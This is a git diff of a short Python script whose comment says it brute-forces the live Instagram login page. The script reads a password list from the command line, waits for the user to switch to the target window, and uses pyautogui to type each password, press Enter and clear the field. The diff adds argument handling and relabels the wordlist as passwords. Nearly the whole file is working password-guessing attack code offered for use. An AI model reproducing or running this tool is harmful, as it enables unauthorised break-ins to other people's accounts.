@@ -1,19 +1,33 @@
-#This code is create by Syed Md Abu Haider for brute force live insta log in page.
+# Syed Md Abu Haider creates this code for brute force live insta log-in page.
 #Use credit to use this tool
+
+
+
+
 import pyautogui
 import time
+import sys
 
-# Path to your text file containing words (one word per line)
-text_file_path = 'path_to_your_text_file.txt'
+# Check if the user has provided the path to the password list file
+if len(sys.argv) != 2:
+    print("Usage: python script_name.py path_to_password_list.txt")
+    sys.exit(1)
 
-# Read words from the text file
-with open(text_file_path, 'r') as file:
-    words = file.read().splitlines()
+# Path to the text file containing passwords (one password per line)
+text_file_path = sys.argv[1]
+
+# Read passwords from the text file
+try:
+    with open(text_file_path, 'r') as file:
+        words = file.read().splitlines()
+except FileNotFoundError:
+    print("File not found:", text_file_path)
+    sys.exit(1)
 
 # Give some time to switch to the target application
 time.sleep(5)
 
-# Type each word, wait for 1 second, hit Enter, and clear the text box
+# Type each password, wait for 1 second, hit Enter, and clear the text box
 for word in words:
     pyautogui.typewrite(word)
     time.sleep(1)       # Wait for 1 second
@@ -24,4 +38,4 @@ for word in words:
     pyautogui.hotkey('ctrl', 'a')  # Select all text
     pyautogui.press('delete')      # Delete selected text
 
-print("All words have been typed, submitted, and text cleared.")
+print("All passwords have been typed, submitted, and text cleared.")
